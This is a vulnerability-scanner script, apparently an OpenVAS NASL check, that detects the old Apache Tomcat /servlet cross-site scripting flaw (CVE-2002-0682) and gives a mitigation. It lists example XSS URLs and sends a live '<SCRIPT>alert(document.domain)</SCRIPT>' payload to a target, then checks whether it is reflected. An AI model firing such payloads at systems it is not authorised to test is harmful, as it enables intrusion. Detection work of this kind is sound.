CPE = "cpe:/a:apache:tomcat";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11041" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_bugtraq_id( 5193 );
	script_cve_id( "CVE-2002-0682" );
	script_name( "Apache Tomcat /servlet Cross Site Scripting" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2002 Matt Moore" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_apache_tomcat_consolidation.sc", "cross_site_scripting.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "apache/tomcat/http/detected" );
	script_tag( name: "summary", value: "The remote Apache Tomcat web server is vulnerable to a cross site scripting
  issue." );
	script_tag( name: "insight", value: "By using the /servlet/ mapping to invoke various servlets / classes it is
  possible to cause Tomcat to throw an exception, allowing XSS attacks, e.g:

  tomcat-server/servlet/org.apache.catalina.servlets.WebdavStatus/SCRIPTalert(document.domain)/SCRIPT
  tomcat-server/servlet/org.apache.catalina.ContainerServlet/SCRIPTalert(document.domain)/SCRIPT
  tomcat-server/servlet/org.apache.catalina.Context/SCRIPTalert(document.domain)/SCRIPT
  tomcat-server/servlet/org.apache.catalina.Globals/SCRIPTalert(document.domain)/SCRIPT

  (angle brackets omitted)" );
	script_tag( name: "solution", value: "The 'invoker' servlet (mapped to /servlet/), which executes anonymous servlet
  classes that have not been defined in a web.xml file should be unmapped.

  The entry for this can be found in the /tomcat-install-dir/conf/web.xml file." );
	script_tag( name: "solution_type", value: "Mitigation" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
host = http_host_name( dont_add_port: TRUE );
if(http_get_has_generic_xss( port: port, host: host )){
	exit( 0 );
}
url = "/servlet/org.apache.catalina.ContainerServlet/<SCRIPT>alert(document.domain)</SCRIPT>";
req = http_get( item: url, port: port );
res = http_keepalive_send_recv( port: port, data: req );
confirmed = NASLString( "<SCRIPT>alert(document.domain)</SCRIPT>" );
confirmed_too = NASLString( "javax.servlet.ServletException" );
if(( ContainsString( res, confirmed ) ) && ( ContainsString( res, confirmed_too ) )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

